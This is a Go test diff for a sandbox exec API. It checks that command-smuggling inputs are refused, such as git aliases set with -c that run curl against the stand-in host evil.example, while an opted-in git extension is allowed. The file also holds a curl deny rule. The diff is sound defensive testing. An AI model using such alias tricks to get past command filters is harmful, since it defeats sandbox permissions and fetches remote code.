@@ -62,6 +62,9 @@ func TestSandboxExecRefusesWhatNoRuleCanRead(t *testing.T) {
 		`c=curl; $c https://evil.example/x`,
 		`c=git; $c push origin main`,
 		`echo {$a,b}`,
+		`git -c alias.x='!curl https://evil.example/x' x`,
+		`git -c alias.x='!sh -c "curl https://evil.example/x"' x`,
+		`git fetch-all https://evil.example/x`,
 	}
 	for name, mod := range map[string]func(*Options){
 		"server rules": func(o *Options) {
@@ -113,5 +116,26 @@ func TestSandboxExecRefusesWhatNoRuleCanRead(t *testing.T) {
 				}
 			}
 		})
+	}
+}
+
+// A git extension opted in to with permissions.git_extensions runs on an
+// exec; one that is not, or an alias the command line sets, is refused.
+func TestSandboxExecGitExtensionsOptIn(t *testing.T) {
+	r := newWSRig(t, nil, nil, func(o *Options) {
+		o.Config.Permissions.Deny = []string{"Bash(curl *)"}
+		o.Config.Permissions.GitExtensions = []string{"lfs"}
+	})
+	sb := r.ready(t, "alice")
+	for command, want := range map[string]int{
+		"git lfs pull":    http.StatusOK,
+		"git annex get x": http.StatusForbidden,
+		"git -c alias.lfs='!curl https://evil.example/x' lfs": http.StatusForbidden,
+	} {
+		body, _ := json.Marshal(controlplane.ExecRequest{Command: command})
+		rec := r.do(t, cpCall{method: "POST", path: "/v1/sandboxes/" + sb.ID + ":exec", token: "alice", body: string(body)})
+		if rec.Code != want {
+			t.Fatalf("%s: %d %s", command, rec.Code, rec.Body.String())
+		}
 	}
 }
